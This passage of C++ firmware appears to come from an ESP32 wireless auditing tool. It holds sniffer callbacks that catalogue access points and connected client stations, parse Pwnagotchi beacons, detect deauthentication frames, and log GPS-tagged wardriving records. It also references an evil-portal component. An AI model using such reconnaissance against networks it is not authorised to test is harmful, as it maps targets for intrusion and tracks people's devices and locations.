  #endif
}

// Function that is called when BLE scan is completed
#ifdef HAS_BT
  void WiFiScan::scanCompleteCB(BLEScanResults scanResults) {
    printf("Scan complete!\n");
    printf("Found %d devices\n", scanResults.getCount());
    scanResults.dump();
  } // scanCompleteCB
#endif

// Function to extract MAC addr from a packet at given offset
void WiFiScan::getMAC(char *addr, uint8_t* data, uint16_t offset) {
  sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
}

void WiFiScan::pwnSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{ 
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String src = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      src.concat(addr);
      if (src == "de:ad:be:ef:de:ad") {
        
        
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        //display_string.concat(addr);
        display_string.concat("CH: " + (String)snifferPacket->rx_ctrl.channel);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");

        // Just grab the first 255 bytes of the pwnagotchi beacon
        // because that is where the name is
        //for (int i = 0; i < snifferPacket->payload[37]; i++)
        for (int i = 0; i < len - 37; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          //display_string.concat((char)snifferPacket->payload[i + 38]);
          if (isAscii(snifferPacket->payload[i + 38]))
            essid.concat((char)snifferPacket->payload[i + 38]);
          else
            Serial.println("Got non-ascii character: " + (String)(char)snifferPacket->payload[i + 38]);
        }
        //essid.concat("\": \"\"}}");
        //Serial.println("\n" + (String)(snifferPacket->payload[37]) + " -> " + essid);

        // Load json
        //DynamicJsonBuffer jsonBuffer; // ArduinoJson v5
        DynamicJsonDocument json(1024); // ArduinoJson v6
        //JsonObject& json = jsonBuffer.parseObject(essid); // ArduinoJson v5
         // ArduinoJson v6
        if (deserializeJson(json, essid)) {
          Serial.println("\nCould not parse Pwnagotchi json");
          display_string.concat(essid);
        }
        else {
          Serial.println("\nSuccessfully parsed json");
          String json_output;
          //json.printTo(json_output); // ArduinoJson v5
          serializeJson(json, json_output); // ArduinoJson v6
          Serial.println(json_output);
          display_string.concat(json["name"].as<String>() + " pwnd: " + json["pwnd_tot"].as<String>());
        }
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          if (display_obj.display_buffer->size() == 0)
          {
            display_obj.loading = true;
            display_obj.display_buffer->add(display_string);
            display_obj.loading = false;
          }
        #endif

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type) {  
  extern WiFiScan wifi_scan_obj;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  String bssid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);

      bool in_list = false;
      bool mac_match = true;

      for (int i = 0; i < access_points->size(); i++) {
        mac_match = true;
        //Serial.print("Checking ");
        //Serial.print(addr);
        //Serial.println(" against " + (String)access_points->get(i).essid);

        
        for (int x = 0; x < 6; x++) {
          //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
          if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
            mac_match = false;
            //Serial.println("MACs do not match");
            break;
          }
        }
        if (mac_match) {
          in_list = true;
          break;
        }
      }

      if (!in_list) {
      
        //delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        //display_string.concat(addr);
        //Serial.print(" ESSID: ");
        //display_string.concat(" -> ");
        //for (int i = 0; i < snifferPacket->payload[37]; i++)
        //{
        //  Serial.print((char)snifferPacket->payload[i + 38]);
        //  display_string.concat((char)snifferPacket->payload[i + 38]);
        //  essid.concat((char)snifferPacket->payload[i + 38]);
        //}
        #ifdef HAS_FULL_SCREEN
          display_string.concat(snifferPacket->rx_ctrl.rssi);
          display_string.concat(" ");
          display_string.concat(snifferPacket->rx_ctrl.channel);
          display_string.concat(" ");
        #endif

        Serial.print(" ESSID: ");
        if (snifferPacket->payload[37] <= 0)
          display_string.concat(addr);
        else {
          for (int i = 0; i < snifferPacket->payload[37]; i++)
          {
            Serial.print((char)snifferPacket->payload[i + 38]);
            display_string.concat((char)snifferPacket->payload[i + 38]);
            essid.concat((char)snifferPacket->payload[i + 38]);
          }
        }

        bssid.concat(addr);
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          //if (display_obj.display_buffer->size() == 0)
          //{
          //display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          //display_obj.loading = false;
          //}
        #endif
        
        if (essid == "") {
          essid = bssid;
          Serial.print(essid + " ");
        }

        //LinkedList<char> beacon = new LinkedList<char>();
        
        /*AccessPoint ap = {essid,
                          snifferPacket->rx_ctrl.channel,
                          {snifferPacket->payload[10],
                           snifferPacket->payload[11],
                           snifferPacket->payload[12],
                           snifferPacket->payload[13],
                           snifferPacket->payload[14],
                           snifferPacket->payload[15]},
                          false,
                          NULL};*/

        AccessPoint ap;
        ap.essid = essid;
        ap.channel = snifferPacket->rx_ctrl.channel;
        ap.bssid[0] = snifferPacket->payload[10];
        ap.bssid[1] = snifferPacket->payload[11];
        ap.bssid[2] = snifferPacket->payload[12];
        ap.bssid[3] = snifferPacket->payload[13];
        ap.bssid[4] = snifferPacket->payload[14];
        ap.bssid[5] = snifferPacket->payload[15];
        ap.selected = false;
        ap.stations = new LinkedList<uint8_t>();
        
        ap.beacon = new LinkedList<char>();

        //for (int i = 0; i < len; i++) {
        //  ap.beacon->add(snifferPacket->payload[i]);
        //}
        ap.beacon->add(snifferPacket->payload[34]);
        ap.beacon->add(snifferPacket->payload[35]);

        Serial.print("\nBeacon: ");

        for (int i = 0; i < ap.beacon->size(); i++) {
          char hexCar[4];
          sprintf(hexCar, "%02X", ap.beacon->get(i));
          Serial.print(hexCar);
          if ((i + 1) % 16 == 0)
            Serial.print("\n");
          else
            Serial.print(" ");
        }

        ap.rssi = snifferPacket->rx_ctrl.rssi;

        access_points->add(ap);

        Serial.print(access_points->size());
        Serial.print(" ");
        Serial.print(esp_get_free_heap_size());

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  String bssid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);

      bool in_list = false;
      bool mac_match = true;

      for (int i = 0; i < access_points->size(); i++) {
        mac_match = true;
        //Serial.print("Checking ");
        //Serial.print(addr);
        //Serial.println(" against " + (String)access_points->get(i).essid);

        
        for (int x = 0; x < 6; x++) {
          //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
          if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
            mac_match = false;
            //Serial.println("MACs do not match");
            break;
          }
        }
        if (mac_match) {
          in_list = true;
          break;
        }
      }

      if (!in_list) {
      
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[37]; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          display_string.concat((char)snifferPacket->payload[i + 38]);
          essid.concat((char)snifferPacket->payload[i + 38]);

          
        }

        bssid.concat(addr);
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          //if (display_obj.display_buffer->size() == 0)
          //{
          //  display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          //  display_obj.loading = false;
          //}
        #endif
        
        if (essid == "") {
          essid = bssid;
          Serial.print(essid + " ");
        }
        
        AccessPoint ap = {essid,
                          snifferPacket->rx_ctrl.channel,
                          {snifferPacket->payload[10],
                           snifferPacket->payload[11],
                           snifferPacket->payload[12],
                           snifferPacket->payload[13],
                           snifferPacket->payload[14],
                           snifferPacket->payload[15]},
                          false,
                          NULL,
                          snifferPacket->rx_ctrl.rssi,
                          new LinkedList<uint8_t>()};

        access_points->add(ap);

        Serial.print(access_points->size());
        Serial.print(" ");
        Serial.print(esp_get_free_heap_size());

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

String WiFiScan::processPwnagotchiBeacon(const uint8_t* frame, int length) {
  // Approximate the start of JSON payload within the beacon frame
  int jsonStartIndex = 36; // Adjust based on actual frame structure if necessary
  int jsonEndIndex = length;

  // Locate the actual JSON boundaries by finding '{' and '}'
  while (jsonStartIndex < length && frame[jsonStartIndex] != '{') jsonStartIndex++;
  while (jsonEndIndex > jsonStartIndex && frame[jsonEndIndex - 1] != '}') jsonEndIndex--;

  if (jsonStartIndex >= jsonEndIndex) {
    Serial.println("JSON payload not found.");
    return "";
  }

  // Extract JSON substring from frame directly
  String jsonString = String((char*)frame + jsonStartIndex, jsonEndIndex - jsonStartIndex);

  // Estimate an appropriate JSON document size based on payload length
  size_t jsonCapacity = jsonString.length() * 1.5; // Adding buffer for ArduinoJson needs

  // Check if we have enough memory before creating StaticJsonDocument
  if (jsonCapacity > ESP.getFreeHeap()) {
    Serial.println("Insufficient memory to parse JSON.");
    return "";
  }

  // Parse JSON payload using ArduinoJson library
  StaticJsonDocument<2048> doc;
  DeserializationError error = deserializeJson(doc, jsonString);

  if (error) {
    Serial.print("Failed to parse JSON: ");
    Serial.println(error.c_str());
    return "";
  }

  // Check for Pwnagotchi keys "name" and "pwnd_tot"
  if (doc.containsKey("name") && doc.containsKey("pwnd_tot")) {
    const char* name = doc["name"];
    const char* ver = doc["version"];
    int pwnd_tot = doc["pwnd_tot"];
    bool deauth = doc["policy"]["deauth"];
    int uptime = doc["uptime"];

    // Print and return the Pwnagotchi name and pwnd_tot
    Serial.print("Pwnagotchi Name: ");
    Serial.println(name);
    Serial.print("Pwnd Totals: ");
    Serial.println(pwnd_tot);

    #ifdef HAS_SCREEN

      display_obj.display_buffer->add(String("Pwnagotchi: ") + name + ",                 ");
      display_obj.display_buffer->add("      Pwnd: " + String(pwnd_tot) + ",             ");
      display_obj.display_buffer->add("    Uptime: " + String(uptime) + ",               ");
      if (deauth)
        display_obj.display_buffer->add("    Deauth: true,                       ");
      else
        display_obj.display_buffer->add("    Deauth: false,                      ");

      display_obj.display_buffer->add(String("       Ver: ") + ver + "                   ");
    #endif

    return String("Pwnagotchi: ") + name + ", \nPwnd: " + String(pwnd_tot) + ", \nVer: " + ver;
  } else {
    Serial.println("Not a Pwnagotchi frame.");
    return "";
  }
}


void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;

  #ifdef HAS_GPS
    extern GpsInterface gps_obj;
    extern EvilPortal evil_portal_obj;
  #endif

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buff = display_obj.display_buffer->size();
    #else
      int buff = 0;
    #endif

    uint8_t target_mac[6] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad};

    // It is a beacon
    if ((snifferPacket->payload[0] == 0x80) && (buff == 0))
    {
      bool mac_match = true;
      for (int i = 0; i < 6; i++) {
        if (snifferPacket->payload[10 + i] != target_mac[i]) {
          mac_match = false;
          break;
        }
      }

      // If MAC matches, call processPwnagotchiBeacon with frame data
      if (mac_match) {
        Serial.println("Pwnagotchi beacon detected!");
        wifi_scan_obj.processPwnagotchiBeacon(snifferPacket->payload, len);
        return;
      }

      if (wifi_scan_obj.currentScanMode == WIFI_SCAN_PWN) {
        buffer_obj.append(snifferPacket, len);
        return;
      }
      
      // Do signal strength stuff first
      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_SIG_STREN) {
        bool found = false;
        uint8_t targ_index = 0;
        AccessPoint targ_ap;

        // Check list of APs
        for (int i = 0; i < access_points->size(); i++) {
          if (access_points->get(i).selected) {
            uint8_t addr[] = {snifferPacket->payload[10],
                              snifferPacket->payload[11],
                              snifferPacket->payload[12],
                              snifferPacket->payload[13],
                              snifferPacket->payload[14],
                              snifferPacket->payload[15]};
            // Compare AP bssid to ssid of recvd packet
            for (int x = 0; x < 6; x++) {
              if (addr[x] != access_points->get(i).bssid[x]) {
                found = false;
                break;
              }
              else
                found = true;
            }
            if (found) {
              //Serial.println("Received beacon from " + access_points->get(i).essid + ". Checking RSSI...");
              targ_ap = access_points->get(i);
              targ_index = i;
              break;
            }
          }
        }
        if (!found)
          return;

        if ((targ_ap.rssi + 5 < snifferPacket->rx_ctrl.rssi) || (snifferPacket->rx_ctrl.rssi + 5 < targ_ap.rssi)) {
          targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
          access_points->set(targ_index, targ_ap);
          Serial.println((String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi);
          return;
        }
      }

      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_AP) {
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        char addr[] = "00:00:00:00:00:00";
        getMAC(addr, snifferPacket->payload, 10);
        Serial.print(addr);
        Serial.print(" ESSID Len: " + (String)snifferPacket->payload[37]);
        Serial.print(" ESSID: ");
        #ifdef HAS_FULL_SCREEN
          display_string.concat(snifferPacket->rx_ctrl.rssi);
          display_string.concat(" ");
          display_string.concat(snifferPacket->rx_ctrl.channel);
          display_string.concat(" ");
        #endif
        if (snifferPacket->payload[37] <= 0)
          display_string.concat(addr);
        else {
          for (int i = 0; i < snifferPacket->payload[37]; i++)
          {
            Serial.print((char)snifferPacket->payload[i + 38]);
            display_string.concat((char)snifferPacket->payload[i + 38]);
          }
        }

        int temp_len = display_string.length();

        #ifdef HAS_SCREEN
          for (int i = 0; i < 40 - temp_len; i++)
          {
            display_string.concat(" ");
          }
    
          Serial.print(" ");
    
          //if (display_obj.display_buffer->size() == 0)
          //{
            display_obj.loading = true;
            display_obj.display_buffer->add(display_string);
            display_obj.loading = false;
          //}
        #endif

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_WAR_DRIVE) {
        #ifdef HAS_GPS
          if (gps_obj.getGpsModuleStatus()) {
            bool do_save = false;  

            // Check if we've already seen this AP
            char addr[] = "00:00:00:00:00:00";
            getMAC(addr, snifferPacket->payload, 10);
            if (wifi_scan_obj.seen_mac(reinterpret_cast<unsigned char*>(addr)))
              return;

            Serial.print("RSSI: ");
            Serial.print(snifferPacket->rx_ctrl.rssi);
            Serial.print(" Ch: ");
            Serial.print(snifferPacket->rx_ctrl.channel);

            if (snifferPacket->payload[37] > 0) {
              Serial.print(" ESSID: ");
              for (int i = 0; i < snifferPacket->payload[37]; i++)
              {
                Serial.print((char)snifferPacket->payload[i + 38]);
                display_string.concat((char)snifferPacket->payload[i + 38]);
                essid.concat((char)snifferPacket->payload[i + 38]);
              }
            }
            else {
              Serial.print(" BSSID: ");
              Serial.print(addr);
              display_string.concat(addr);
            }

            if (gps_obj.getFixStatus()) {
              do_save = true;
              display_string.concat(" | Lt: " + gps_obj.getLat());
              display_string.concat(" | Ln: " + gps_obj.getLon());
            }
            else
              display_string.concat(" | GPS: No Fix");

            int temp_len = display_string.length();

            #ifdef HAS_SCREEN
              for (int i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
        
              Serial.print(" ");
        
              if (display_obj.display_buffer->size() == 0)
              {
                display_obj.loading = true;
                display_obj.display_buffer->add(display_string);
                display_obj.loading = false;
              }
            #endif

            Serial.println();

            wifi_scan_obj.save_mac(reinterpret_cast<unsigned char*>(addr));

            int n = WiFi.scanNetworks(false, true, false, 110, wifi_scan_obj.set_channel);

            if (do_save) {
              if (n > 0) {
                for (int i = 0; i < n; i++) {
                  Serial.printf("%-32.32s", WiFi.SSID(i).c_str());
                  Serial.print(" -> ");
                  Serial.println(wifi_scan_obj.security_int_to_string(WiFi.encryptionType(i)).c_str());
                }
              }
              String wardrive_line = (String)addr + "," + essid + "," + wifi_scan_obj.security_int_to_string(snifferPacket->rx_ctrl.channel) + "," + gps_obj.getDatetime() + "," + (String)snifferPacket->rx_ctrl.channel + "," + (String)snifferPacket->rx_ctrl.rssi + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",WIFI";
              Serial.println(wardrive_line);
              //buffer_obj.append(wardrive_line);
            }
          }
        #endif
      }      
    }
  }
}

void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String mac = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }

  char ap_addr[] = "00:00:00:00:00:00";
  char dst_addr[] = "00:00:00:00:00:00";

  int ap_index = 0;

  // Check if frame has ap in list of APs and determine position
  uint8_t frame_offset = 0;
  int offsets[2] = {10, 4};
  bool matched_ap = false;
  bool ap_is_src = false;

  bool mac_match = true;

  for (int y = 0; y < 2; y++) {
    for (int i = 0; i < access_points->size(); i++) {
      mac_match = true;
      
      for (int x = 0; x < 6; x++) {
        //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
        if (snifferPacket->payload[x + offsets[y]] != access_points->get(i).bssid[x]) {
          mac_match = false;
          break;
        }
      }
      if (mac_match) {
        matched_ap = true;
        if (offsets[y] == 10)
          ap_is_src = true;
        ap_index = i;
        getMAC(ap_addr, snifferPacket->payload, offsets[y]);
        break;
      }
    }
    if (matched_ap)
      break;
  }

  // If did not find ap from list in frame, drop frame
  if (!matched_ap)
    return;
  else {
    if (ap_is_src)
      frame_offset = 4;
    else
      frame_offset = 10;
  }
  /*  Stuff to care about now
   *  ap_is_src
   *  ap_index
   */
  

  // Check if we already have this station
  bool in_list = false;
  for (int i = 0; i < stations->size(); i++) {
    mac_match = true;
    
    for (int x = 0; x < 6; x++) {
      //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
      if (snifferPacket->payload[x + frame_offset] != stations->get(i).mac[x]) {
        mac_match = false;
        //Serial.println("MACs do not match");
        break;
      }
    }
    if (mac_match) {
      in_list = true;
      break;
    }
  }

  getMAC(dst_addr, snifferPacket->payload, 4);

  // Check if dest is broadcast
  if ((in_list) || (strcmp(dst_addr, "ff:ff:ff:ff:ff:ff") == 0))
    return;
  
  // Add to list of stations
  Station sta = {
                {snifferPacket->payload[frame_offset],
                 snifferPacket->payload[frame_offset + 1],
                 snifferPacket->payload[frame_offset + 2],
                 snifferPacket->payload[frame_offset + 3],
                 snifferPacket->payload[frame_offset + 4],
                 snifferPacket->payload[frame_offset + 5]},
                false};

  stations->add(sta);

  // Print findings to serial
  Serial.print((String)stations->size() + ": ");
  
  char sta_addr[] = "00:00:00:00:00:00";
  
  if (ap_is_src) {
    Serial.print("ap: ");
    Serial.print(ap_addr);
    Serial.print(" -> sta: ");
    getMAC(sta_addr, snifferPacket->payload, 4);
    Serial.println(sta_addr);
  }
  else {
    Serial.print("sta: ");
    getMAC(sta_addr, snifferPacket->payload, 10);
    Serial.print(sta_addr);
    Serial.print(" -> ap: ");
    Serial.println(ap_addr);
  }
  display_string.concat(sta_addr);
  display_string.concat(" -> ");
  display_string.concat(access_points->get(ap_index).essid);

  int temp_len = display_string.length();

  #ifdef HAS_SCREEN
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }

    Serial.print(" ");

    if (display_obj.display_buffer->size() == 0)
    {
      display_obj.loading = true;
      display_obj.display_buffer->add(display_string);
      display_obj.loading = false;
    }
  #endif

  // Add station index to AP in list
  //access_points->get(ap_index).stations->add(stations->size() - 1);

  AccessPoint ap = access_points->get(ap_index);
  ap.stations->add(stations->size() - 1);

  access_points->set(ap_index, ap);

  buffer_obj.append(snifferPacket, len);
}

void WiFiScan::rawSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }

  if (wifi_scan_obj.currentScanMode == WIFI_SCAN_SIG_STREN) {
    bool found = false;
    uint8_t targ_index = 0;
    AccessPoint targ_ap;

    // Check list of APs
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected) {
        uint8_t addr[] = {snifferPacket->payload[10],
                          snifferPacket->payload[11],
                          snifferPacket->payload[12],
                          snifferPacket->payload[13],
                          snifferPacket->payload[14],
                          snifferPacket->payload[15]};
        // Compare AP bssid to ssid of recvd packet
        for (int x = 0; x < 6; x++) {
          if (addr[x] != access_points->get(i).bssid[x]) {
            found = false;
            break;
          }
          else
            found = true;
        }
        if (found) {
          targ_ap = access_points->get(i);
          targ_index = i;
          break;
        }
      }
    }
    if (!found)
      return;

    if ((targ_ap.rssi + 5 < snifferPacket->rx_ctrl.rssi) || (snifferPacket->rx_ctrl.rssi + 5 < targ_ap.rssi)) {
      targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
      access_points->set(targ_index, targ_ap);
      Serial.print((String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi);
      display_string = (String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi;
    }
    else
      return;
  }

  else {
    Serial.print("RSSI: ");
    Serial.print(snifferPacket->rx_ctrl.rssi);
    Serial.print(" Ch: ");
    Serial.print(snifferPacket->rx_ctrl.channel);
    Serial.print(" BSSID: ");
    char addr[] = "00:00:00:00:00:00";
    getMAC(addr, snifferPacket->payload, 10);
    Serial.print(addr);
    display_string.concat(text_table4[0]);
    display_string.concat(snifferPacket->rx_ctrl.rssi);

    display_string.concat(" ");
    display_string.concat(addr);
  }

  int temp_len = display_string.length();

  #ifdef HAS_SCREEN
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }

    Serial.print(" ");

    if (display_obj.display_buffer->size() == 0)
    {
      display_obj.loading = true;
      display_obj.display_buffer->add(display_string);
      display_obj.loading = false;
    }
  #endif

  Serial.println();

  buffer_obj.append(snifferPacket, len);
}

void WiFiScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ) && (buf == 0))
    {
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" BSSID: ");
      char addr[] = "00:00:00:00:00:00";
      char dst_addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      getMAC(dst_addr, snifferPacket->payload, 4);
      Serial.print(addr);
      Serial.print(" -> ");
      Serial.print(dst_addr);
      display_string.concat(text_table4[0]);
      display_string.concat(snifferPacket->rx_ctrl.rssi);

      display_string.concat(" ");
      display_string.concat(addr);

      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[37]; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");
  
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
      
      Serial.println();

      buffer_obj.append(snifferPacket, len);
    }
  }
}

void WiFiScan::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {

  extern WiFiScan wifi_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

